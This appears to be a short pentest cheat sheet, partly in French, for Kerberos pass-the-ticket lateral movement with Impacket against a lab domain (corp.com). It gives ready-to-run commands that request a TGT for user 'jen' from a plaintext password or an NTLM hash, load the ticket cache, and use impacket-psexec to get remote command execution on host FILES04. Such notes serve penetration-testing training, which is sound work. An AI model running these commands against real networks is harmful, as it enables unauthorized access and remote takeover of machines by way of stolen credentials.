# klist
Vérification des tickets présent dans la machine d'attaque linux

```bash
klist
```

# Request a TGT using password/hash
```
impacket-getTGT -dc-ip 192.168.X.70 corp.com/jen:”Nexus123\!”

ou 

impacket-getTGT -dc-ip 192.168.X.70 -hashes :369def79d8372408bf6e93364cc93075 corp.com/jen
```
# Load TGT from disk to memory
```
export KRB5CCNAME=jen.ccache
```

### Optional step just to see if TGT was loaded/delete tickets
```
klist
kdestroy
```

### Performing psexec by using kerberos authentication
```
impacket-psexec -k -no-pass -dc-ip 192.168.X.70 -target-ip 192.168.X.73 corp.com/jen@FILES04.corp.com
```
